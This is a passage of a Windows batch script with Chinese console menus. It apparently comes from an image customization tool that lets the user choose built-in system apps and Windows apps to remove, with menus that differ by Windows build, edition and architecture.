	if !errorlevel!==6  set "Component=ContentDeliveryManager"
	if !errorlevel!==5  set "Component=PPIProjection"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    ______________________________ 系统应用一 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 指定访问锁定应用 ^| 依赖于：分配的访问权限                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX 代理插件                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 生物注册应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| 需要全新体验应用程序                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Edge                                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 目视控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 文件资源管理器应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 锁屏应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 地图控件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] OneDrive 桌面客户端                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=OneDrive"
	if !errorlevel!==11 set "Component=NarratorQuickStart"
	if !errorlevel!==10 set "Component=MapControl"
	if !errorlevel!==9  set "Component=LockApp"
	if !errorlevel!==8  set "Component=FileExplorer"
	if !errorlevel!==7  set "Component=ECApp"
	if !errorlevel!==6  set "Component=Edge"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

:RemoveSystemAppsMenu2
cls&mode con cols=80 lines=40&title 精简系统应用二
set "goto=:RemoveSystemAppsMenu2"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ______________________________ 系统应用二 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 家长控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 人脉栏                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 快速助手应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 零售演示内容                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 设置同步                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| 依赖于：Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Win32 Web View 主机                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Windows Defender 应用                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows 混合现实                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows PDF 阅读器                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsReaderPDF"
	if !errorlevel!==10 set "Component=WindowsMixedReality"
	if !errorlevel!==9 set "Component=WindowsDefender"
	if !errorlevel!==8 set "Component=Win32WebViewHost"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ______________________________ 系统应用二 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 家长控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 人脉栏                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 快速助手应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 零售演示内容                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 设置同步                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| 依赖于：Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Win32 Web View 主机                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Windows Defender 应用                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows 混合现实                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows PDF 阅读器                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsReaderPDF"
	if !errorlevel!==10 set "Component=WindowsMixedReality"
	if !errorlevel!==9 set "Component=WindowsDefender"
	if !errorlevel!==8 set "Component=Win32WebViewHost"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ______________________________ 系统应用二 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] OneDrive 桌面客户端                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 家长控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 人脉栏                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 快速助手应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 零售演示内容                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 设置同步                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Smart Screen ^| 依赖于：Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Take Test 应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Win32 Web View 主机                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows Defender 应用                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Windows 混合现实                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==15 goto :RemoveSystemAppsMenu
	if !errorlevel!==14 set "Component=SystemApps2"
	if !errorlevel!==13 set "Component=XboxGameCallableUI"
	if !errorlevel!==12 set "Component=WindowsMixedReality"
	if !errorlevel!==11 set "Component=WindowsDefender"
	if !errorlevel!==10 set "Component=Win32WebViewHost"
	if !errorlevel!==9 set "Component=SecureAssessmentBrowser"
	if !errorlevel!==8 set "Component=SmartScreen"
	if !errorlevel!==7 set "Component=SkypeORTC"
	if !errorlevel!==6 set "Component=SettingSync"
	if !errorlevel!==5 set "Component=RetailDemoContent"
	if !errorlevel!==4 set "Component=QuickAssist"
	if !errorlevel!==3 set "Component=PeopleExperienceHost"
	if !errorlevel!==2 set "Component=ParentalControls"
	if !errorlevel!==1 set "Component=OneDrive"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    ______________________________ 系统应用二 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 家长控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 人脉栏                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 快速助手应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 零售演示内容                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 设置同步                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| 依赖于：Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Take Test 应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Win32 Web View 主机                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows Defender 应用                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows 混合现实                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsMixedReality"
	if !errorlevel!==10 set "Component=WindowsDefender"
	if !errorlevel!==9 set "Component=Win32WebViewHost"
	if !errorlevel!==8 set "Component=SecureAssessmentBrowser"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu
cls&mode con cols=80 lines=30&title 精简Windows 应用
set "goto="
echo.        
echo.    _____________________________ Windows 应用 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] Windows应用一                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] Windows应用二                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Windows应用三                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:123X /n /m ">>>>>>>请输入选择:"
if !errorlevel!==4 goto :RemoveMenu
if !errorlevel!==3 goto :RemoveWindowsAppsMenu3
if !errorlevel!==2 goto :RemoveWindowsAppsMenu2
if !errorlevel!==1 goto :RemoveWindowsAppsMenu1

:RemoveWindowsAppsMenu1
cls&mode con cols=80 lines=48&title 精简Windows应用一
set "goto=:RemoveWindowsAppsMenu1"
if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x86" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用一 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 闹钟和时钟应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 计算器应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 相机应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 桌面应用安装程序                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 反馈中心应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 电影和电视应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 获取帮助                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google 的 VP9 WebM 视频编解码器插件                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove 音乐应用                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 高效图像文件 ^(HEIF^) 编解码器插件                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 地图应用 ^| 依赖于：地图控件                                      ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] 消息应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] Microsoft Pay 应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] 混合现实查看器应用 ^| 依赖于：Windows Mixed Reality               ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 移动套餐应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps1"
	if !errorlevel!==16 set "Component=OneConnect"
	if !errorlevel!==15 set "Component=3DViewer"
	if !errorlevel!==14 set "Component=WalletService"
	if !errorlevel!==13 set "Component=Messaging"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=ZuneVideo"
	if !errorlevel!==6  set "Component=FeedbackHub"
	if !errorlevel!==5  set "Component=DesktopAppInstaller"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x64" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用一 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 闹钟和时钟应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 计算器应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 相机应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 桌面应用安装程序                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 反馈中心应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 电影和电视应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 获取帮助                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google 的 VP9 WebM 视频编解码器插件                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove 音乐应用                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 高效图像文件 ^(HEIF^) 编解码器插件                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 地图应用 ^| 依赖于：地图控件                                      ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] 消息应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] Microsoft Pay 应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] 混合现实查看器应用 ^| 依赖于：Windows Mixed Reality               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 混合现实查看器应用 ^| 依赖于：Windows 混合现实                    ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 移动套餐应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps1"
	if !errorlevel!==17 set "Component=OneConnect"
	if !errorlevel!==16 set "Component=3DViewer"
	if !errorlevel!==15 set "Component=MixedRealityPortal"
	if !errorlevel!==14 set "Component=WalletService"
	if !errorlevel!==13 set "Component=Messaging"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=ZuneVideo"
	if !errorlevel!==6  set "Component=FeedbackHub"
	if !errorlevel!==5  set "Component=DesktopAppInstaller"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x86" (
	echo.        
	echo.    ____________________________ Windows 应用一 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 闹钟和时钟应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 计算器应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 相机应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Cortana 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 桌面应用安装程序                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 反馈中心应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 获取帮助                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google 的 VP9 WebM 视频编解码器插件                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove 音乐应用                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 高效图像文件 ^(HEIF^) 编解码器插件                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 地图应用 ^| 依赖于：地图控件                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Microsoft Pay 应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] 混合现实查看器应用 ^| 依赖于：Windows 混合现实                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] 电影和电视应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==17 goto :RemoveWindowsAppsMenu
	if !errorlevel!==16 set "Component=WindowsApps1"
	if !errorlevel!==15 set "Component=ZuneVideo"
	if !errorlevel!==14 set "Component=3DViewer"
	if !errorlevel!==13 set "Component=WalletService"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=FeedbackHub"
	if !errorlevel!==6  set "Component=DesktopAppInstaller"
	if !errorlevel!==5  set "Component=Cortana"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x64" (
	echo.        
	echo.    ____________________________ Windows 应用一 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] 闹钟和时钟应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 计算器应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 相机应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Cortana 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] 桌面应用安装程序                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 反馈中心应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 获取帮助                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google 的 VP9 WebM 视频编解码器插件                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove 音乐应用                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 高效图像文件 ^(HEIF^) 编解码器插件                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 地图应用 ^| 依赖于：地图控件                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Microsoft Pay 应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] 混合现实查看器应用 ^| 依赖于：Windows 混合现实                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] 混合现实查看器应用 ^| 依赖于：Windows Mixed Reality               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] 电影和电视应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps1"
	if !errorlevel!==16 set "Component=ZuneVideo"
	if !errorlevel!==15 set "Component=3DViewer"
	if !errorlevel!==14 set "Component=MixedRealityPortal"
	if !errorlevel!==13 set "Component=WalletService"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=FeedbackHub"
	if !errorlevel!==6  set "Component=DesktopAppInstaller"
	if !errorlevel!==5  set "Component=Cortana"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu2
cls&mode con cols=80 lines=48&title 精简Windows应用二
set "goto=:RemoveWindowsAppsMenu2"
if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x86" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用二 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 我的 Office 应用                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 画图 3D 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] 人脉应用 ^| 依赖于：人脉栏                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 照片应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Print 3D 应用                                                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] 截图和草图应用                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Skype 应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Solitaire Collection 应用 ^| 依赖于：Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
	echo.   ^|   [J] 便笺应用                                                         ^|
	echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
	echo.   ^|   [J] 便笺应用 ^| 依赖于：Windows 应用商店                              ^|
	echo.   ^|                                                                        ^|
)
	echo.   ^|   [K] 使用技巧应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 录音机应用                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 天气应用 ^| 依赖于：Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [N] Web 媒体编解码器插件                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] WebP 图像编解码器插件                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] Windows 邮件应用 ^| 依赖于：Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] 你的手机应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps2"
	if !errorlevel!==17 set "Component=YourPhone"
	if !errorlevel!==16 set "Component=CommunicationsApps"
	if !errorlevel!==15 set "Component=WebpImageExtensions"
	if !errorlevel!==14 set "Component=WebMediaExtensions"
	if !errorlevel!==13 set "Component=BingWeather"
	if !errorlevel!==12 set "Component=SoundRecorder"
	if !errorlevel!==11 set "Component=Getstarted"
	if !errorlevel!==10 set "Component=StickyNotes"
	if !errorlevel!==9 set "Component=SolitaireCollection"
	if !errorlevel!==8 set "Component=SkypeApp"
	if !errorlevel!==7 set "Component=ScreenSketch"
	if !errorlevel!==6 set "Component=Print3D"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x64" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows 应用二 ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 我的 Office 应用                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote 应用                                                     ^|
